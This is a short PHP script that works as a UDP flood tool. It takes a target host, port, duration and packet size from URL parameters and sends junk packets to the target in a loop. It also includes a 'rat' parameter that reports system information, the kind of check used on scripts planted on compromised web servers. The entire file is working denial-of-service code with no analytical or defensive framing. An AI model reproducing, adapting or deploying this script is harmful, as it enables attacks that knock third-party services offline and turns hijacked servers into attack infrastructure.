<?php
set_time_limit(999999);
$host = $_GET['host'];
$port = $_GET['port'];
$exec_time = $_GET['time'];
$Sendlen = $_GET['len'];
ignore_user_abort(True);

if (StrLen($host)==0 or StrLen($port)==0 or StrLen($exec_time)==0)
{
	if (StrLen($_GET['rat'])<>0)
	{
		echo php_uname();
		exit;
	}
	exit;
}

for($i=0; $i < $Sendlen; $i++)
{
	$out .= "A";
}

$max_time = time() + $exec_time;
while(1)
{
    if(time() > $max_time)
	{
        break;
    }
    $fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);
    if($fp)
	{
		fwrite($fp, $out);
		fclose($fp);
    }
}
?> 
